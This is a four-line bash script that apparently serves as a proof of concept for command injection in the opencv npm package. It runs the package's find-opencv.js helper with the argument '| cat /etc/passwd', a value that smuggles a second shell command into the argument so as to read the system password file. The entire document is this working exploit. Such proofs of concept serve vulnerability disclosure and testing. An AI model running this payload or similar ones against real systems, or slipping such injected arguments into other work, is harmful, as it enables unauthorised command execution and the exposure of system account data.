#!/bin/bash

path_to_js="node_modules/opencv/utils/find-opencv.js"
arg="| cat /etc/passwd"

node $path_to_js "$arg"
